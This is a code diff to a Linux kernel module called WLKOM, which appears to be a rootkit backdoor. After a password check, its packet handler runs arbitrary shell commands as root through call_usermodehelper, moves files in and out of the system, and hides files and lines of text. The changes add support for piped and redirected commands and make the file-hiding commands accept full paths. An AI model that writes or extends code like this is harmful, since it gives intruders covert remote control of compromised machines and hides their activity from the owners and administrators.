@@ -25,7 +25,7 @@ static void read_tmp_output(char **output, size_t *output_len)
     f = filp_open(TMP_OUTPUT, O_RDONLY, 0);
     if (IS_ERR(f))
     {
-        *output     = NULL;
+        *output     = kstrdup("", GFP_KERNEL);
         *output_len = 0;
         return;
     }
@@ -46,27 +46,82 @@ static void read_tmp_output(char **output, size_t *output_len)
     }
     pos         = 0;
     *output_len = kernel_read(f, *output, size, &pos);
-    (*output)[*output_len] = '\0';
+    if (*output_len > 0)
+        (*output)[*output_len] = '\0';
     filp_close(f, NULL);
 }
 
 /**
  * @brief Executes a shell command via usermodehelper and captures stdout/stderr.
- * @param cmd         Shell command string.
+ *        If command has redirection (>, |), executes directly without capture.
+ *        Otherwise, captures output to /tmp/.wlkom_out.
+ * @param cmd         Shell command string (must be null-terminated).
  * @param output      Output: heap-allocated result (caller must kfree).
  * @param output_len  Output: result length in bytes.
  */
 static void exec_command(const char *cmd, char **output, size_t *output_len)
 {
-    char  full_cmd[CMD_BUFSIZE];
-    char *argv[]    = { "/bin/sh", "-c", full_cmd, NULL };
-    char *envp[]    = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
-    char *rm_argv[] = { "/bin/rm", "-f", TMP_OUTPUT, NULL };
+    char  *full_cmd;
+    char  *argv[4];
+    char  *envp[3];
+    char  *rm_argv[4];
+    int    has_redirect;
 
-    snprintf(full_cmd, sizeof(full_cmd), "%s > %s 2>&1", cmd, TMP_OUTPUT);
+    *output     = NULL;
+    *output_len = 0;
+
+    if (!cmd || strlen(cmd) == 0)
+    {
+        *output = kstrdup("", GFP_KERNEL);
+        return;
+    }
+
+    full_cmd = kmalloc(CMD_BUFSIZE, GFP_KERNEL);
+    if (!full_cmd)
+        return;
+
+    has_redirect = (strchr(cmd, '>') != NULL) || (strchr(cmd, '|') != NULL);
+
+    if (has_redirect)
+    {
+        snprintf(full_cmd, CMD_BUFSIZE, "%s", cmd);
+    }
+    else
+    {
+        snprintf(full_cmd, CMD_BUFSIZE, "%s > %s 2>&1", cmd, TMP_OUTPUT);
+    }
+
+    argv[0] = "/bin/sh";
+    argv[1] = "-c";
+    argv[2] = full_cmd;
+    argv[3] = NULL;
+
+    envp[0] = "HOME=/";
+    envp[1] = "PATH=/sbin:/bin:/usr/sbin:/usr/bin";
+    envp[2] = NULL;
+
+    if (has_redirect)
+        pr_info("WLKOM exec: redirect detected, executing: %s\n", full_cmd);
+
     call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
-    read_tmp_output(output, output_len);
-    call_usermodehelper(rm_argv[0], rm_argv, envp, UMH_WAIT_PROC);
+
+    if (!has_redirect)
+    {
+        read_tmp_output(output, output_len);
+        rm_argv[0] = "/bin/rm";
+        rm_argv[1] = "-f";
+        rm_argv[2] = TMP_OUTPUT;
+        rm_argv[3] = NULL;
+        call_usermodehelper(rm_argv[0], rm_argv, envp, UMH_WAIT_PROC);
+    }
+    else
+    {
+        *output = kstrdup("OK", GFP_KERNEL);
+        *output_len = 2;
+        pr_info("WLKOM exec: redirect completed\n");
+    }
+
+    kfree(full_cmd);
 }
 
 /**
@@ -78,7 +133,7 @@ static void exec_command(const char *cmd, char **output, size_t *output_len)
  */
 static int handle_auth(conn_ctx_t *ctx, char *payload, uint32_t len)
 {
-    if (len == 0 || strncmp(payload, WLKOM_PASSWORD, len) != 0)
+    if (len == 0 || !ctx->password || strncmp(payload, ctx->password, len) != 0)
     {
         pr_warn("WLKOM commands: bad password\n");
         send_packet(ctx, CMD_AUTH, "FAIL", 4);
@@ -179,6 +234,38 @@ static void handle_download(conn_ctx_t *ctx, char *payload)
 }
 
 /**
+ * @brief Extracts basename from a path (everything after the last '/').
+ * @param path  Full path or basename.
+ * @return Pointer to the basename within @p path.
+ */
+static const char *get_basename(const char *path)
+{
+    const char *slash = strrchr(path, '/');
+
+    return slash ? slash + 1 : path;
+}
+
+/**
+ * @brief Wrapper: extract basename from path, then hide the file.
+ * @param path  Full path or basename of file to hide.
+ */
+static void handle_hide_file_wrapper(const char *path)
+{
+    if (path)
+        hide_file(get_basename(path));
+}
+
+/**
+ * @brief Wrapper: extract basename from path, then unhide the file.
+ * @param path  Full path or basename of file to unhide.
+ */
+static void handle_unhide_file_wrapper(const char *path)
+{
+    if (path)
+        unhide_file(get_basename(path));
+}
+
+/**
  * @brief Handles CMD_HIDE_LINE / CMD_UNHIDE_LINE.
  *        Payload format: [filename\0][pattern].
  * @param ctx      Connection context.
@@ -217,8 +304,8 @@ int handle_packet(conn_ctx_t *ctx, uint8_t opcode, char *payload, uint32_t len)
     case CMD_EXEC:        handle_exec(ctx, payload);                         break;
     case CMD_UPLOAD:      handle_upload(ctx, payload, len);                  break;
     case CMD_DOWNLOAD:    handle_download(ctx, payload);                     break;
-    case CMD_HIDE_FILE:   if (payload) hide_file(payload);                  break;
-    case CMD_UNHIDE_FILE: if (payload) unhide_file(payload);                break;
+    case CMD_HIDE_FILE:   handle_hide_file_wrapper(payload);                break;
+    case CMD_UNHIDE_FILE: handle_unhide_file_wrapper(payload);              break;
     case CMD_HIDE_LINE:   handle_hide_line(ctx, payload, len, true);        break;
     case CMD_UNHIDE_LINE: handle_hide_line(ctx, payload, len, false);       break;
     default:
